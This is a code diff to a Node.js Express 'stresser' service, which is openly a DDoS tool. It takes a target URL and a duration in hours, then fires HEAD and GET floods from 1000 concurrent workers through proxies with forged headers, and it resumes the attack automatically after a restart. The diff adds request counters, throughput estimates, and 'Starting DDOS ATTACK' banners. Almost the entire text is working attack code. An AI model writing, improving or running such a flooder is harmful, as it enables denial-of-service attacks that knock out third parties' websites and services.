@@ -11,9 +11,11 @@ app.use(express.json());
 
 const stateFilePath = path.join(__dirname, 'attackState.json');
 
-// customize it which is best you may need HIGH END VPS SERVER
-const REQUESTS_PER_THREAD = 2; // Number of requests per thread per batch 
+// Configuration
+const REQUESTS_PER_THREAD = 2; // Number of requests per thread per batch
 const numThreads = 1000; // Number of threads
+let totalRequestsSent = 0; // Counter for total successful requests
+let batchDurations = []; // Array to store batch durations for dynamic estimation
 
 const ensureStateFileExists = () => {
     if (!fs.existsSync(stateFilePath)) {
@@ -44,6 +46,7 @@ if (continueAttack && startTime && duration) {
         continueAttack = false;
         state = { continueAttack: false, startTime: null, duration: 0, targetUrl: null };
         fs.writeFileSync(stateFilePath, JSON.stringify(state));
+        console.log(rainbow(`Attack stopped: Duration expired for previous attack on ${targetUrl}.`));
     }
 }
 
@@ -118,6 +121,17 @@ const loadProxies = () => {
     }
 };
 
+const estimateTotalRequests = (durationHours) => {
+    const durationSeconds = durationHours * 60 * 60;
+    const requestsPerBatch = numThreads * REQUESTS_PER_THREAD * 2; // HEAD + GET
+    // Use average batch duration if available, otherwise assume 1 second as fallback
+    const avgBatchDuration = batchDurations.length > 0 
+        ? batchDurations.reduce((sum, duration) => sum + duration, 0) / batchDurations.length / 1000
+        : 1;
+    const totalBatches = durationSeconds / avgBatchDuration;
+    return Math.round(totalBatches * requestsPerBatch);
+};
+
 const performAttack = async (url, agent, threadId) => {
     if (!continueAttack) return;
 
@@ -128,7 +142,7 @@ const performAttack = async (url, agent, threadId) => {
             continueAttack = false;
             state = { continueAttack: false, startTime: null, duration: 0, targetUrl: null };
             fs.writeFileSync(stateFilePath, JSON.stringify(state));
-            console.log(rainbow(`Attack duration expired. Stopping thread ${threadId}.`));
+            console.log(rainbow(`Thread ${threadId}: Stopped due to duration expiration.`));
             return;
         }
     }
@@ -156,15 +170,17 @@ const performAttack = async (url, agent, threadId) => {
         "Origin": url.split("/").slice(0, 3).join("/")
     };
 
-    // Create an array of 10,000 HEAD and GET requests
+    // Create an array of REQUESTS_PER_THREAD HEAD and GET requests
     const requests = Array.from({ length: REQUESTS_PER_THREAD }, () => [
         axios.head(url, { httpAgent: agent, headers: headersForRequest }),
         axios.get(url, { httpAgent: agent, headers: headersForRequest, timeout: 0 })
     ]).flat();
 
+    const batchStartTime = Date.now();
+
     try {
-        // Send all 10,000 requests simultaneously
-        await Promise.allSettled(requests.map(request => request.catch(err => {
+        // Send all requests simultaneously
+        const results = await Promise.allSettled(requests.map(request => request.catch(err => {
             if (err.code === "ECONNRESET" || err.code === "ECONNREFUSED" || err.code === "EHOSTUNREACH" || err.code === "ETIMEDOUT" || err.code === "EAI_AGAIN" || err.message === "Socket is closed") {
                 // console.log(rainbow(`Thread ${threadId}: Unable to Attack Target Server Refused!`));
             } else if (err.response?.status === 404) {
@@ -183,7 +199,16 @@ const performAttack = async (url, agent, threadId) => {
             return null; // Return null for failed requests
         })));
 
-        console.log(rainbow(`Thread ${threadId}: Completed batch of ${REQUESTS_PER_THREAD * 2} requests.`));
+        const batchDuration = Date.now() - batchStartTime;
+        batchDurations.push(batchDuration); // Store batch duration (in milliseconds)
+
+        const successfulRequests = results.filter(result => result.status === 'fulfilled' && result.value).length;
+        totalRequestsSent += successfulRequests;
+
+        console.log(rainbow(
+            `Thread ${threadId}: Completed batch of ${successfulRequests} successful requests ` +
+            `(Total sent: ${totalRequestsSent.toLocaleString()}) in ${(batchDuration / 1000).toFixed(2)} seconds`
+        ));
 
         // Continue with the next batch if duration allows
         if (continueAttack) {
@@ -214,15 +239,32 @@ const startAttack = (url, durationHours) => {
     targetUrl = url;
     startTime = Date.now();
     duration = durationHours * 60 * 60 * 1000; // Convert hours to milliseconds
+    totalRequestsSent = 0; // Reset request counter
+    batchDurations = []; // Reset batch durations
 
     state = { continueAttack, startTime, duration, targetUrl };
     fs.writeFileSync(stateFilePath, JSON.stringify(state));
+
+    const estimatedRequests = estimateTotalRequests(durationHours);
+    console.log(rainbow(
+        `🚀 Starting Attack 🚀\n` +
+        `Target: ${url}\n` +
+        `Duration: ${durationHours} hour(s)\n` +
+        `Threads: ${numThreads}\n` +
+        `Requests per Thread per Batch: ${REQUESTS_PER_THREAD * 2} (HEAD + GET)\n` +
+        `Estimated Total Requests: ${estimatedRequests.toLocaleString()}`
+    ));
 
     const attackTimeout = setTimeout(() => {
         continueAttack = false;
         state = { continueAttack: false, startTime: null, duration: 0, targetUrl: null };
         fs.writeFileSync(stateFilePath, JSON.stringify(state));
-        console.log(rainbow("Attack duration expired. All threads stopped."));
+        console.log(rainbow(
+            `🛑 Attack Stopped 🛑\n` +
+            `Target: ${url}\n` +
+            `Duration: ${durationHours} hour(s)\n` +
+            `Total Requests Sent: ${totalRequestsSent.toLocaleString()}`
+        ));
     }, duration);
 
     for (let i = 0; i < numThreads; i++) {
@@ -250,7 +292,7 @@ app.get("/stresser", async (req, res) => {
         return res.status(400).json({ error: "Invalid duration. Please provide a positive duration in hours." });
     }
 
-    await res.json({ message: `Starting DDOS ATTACK with ${numThreads} threads, each sending ${REQUESTS_PER_THREAD} requests per batch...` });
+    await res.json({ message: `Starting DDOS ATTACK with ${numThreads} threads, each sending ${REQUESTS_PER_THREAD * 2} requests per batch...` });
     startAttack(url, durationHours);
 });
 
@@ -261,11 +303,21 @@ app.listen(port, () => {
         console.log(rainbow('Resuming previous attack...'));
         const remainingDuration = (startTime + duration - Date.now()) / (60 * 60 * 1000); // Convert milliseconds back to hours
         if (remainingDuration > 0) {
+            const estimatedRequests = estimateTotalRequests(remainingDuration);
+            console.log(rainbow(
+                `🔄 Resuming Attack 🔄\n` +
+                `Target: ${targetUrl}\n` +
+                `Remaining Duration: ${remainingDuration.toFixed(2)} hour(s)\n` +
+                `Threads: ${numThreads}\n` +
+                `Requests per Thread per Batch: ${REQUESTS_PER_THREAD * 2} (HEAD + GET)\n` +
+                `Estimated Total Requests: ${estimatedRequests.toLocaleString()}`
+            ));
             startAttack(targetUrl, remainingDuration);
         } else {
             continueAttack = false;
             state = { continueAttack: false, startTime: null, duration: 0, targetUrl: null };
             fs.writeFileSync(stateFilePath, JSON.stringify(state));
+            console.log(rainbow(`Attack stopped: Duration expired for previous attack on ${targetUrl}.`));
         }
     }
 });
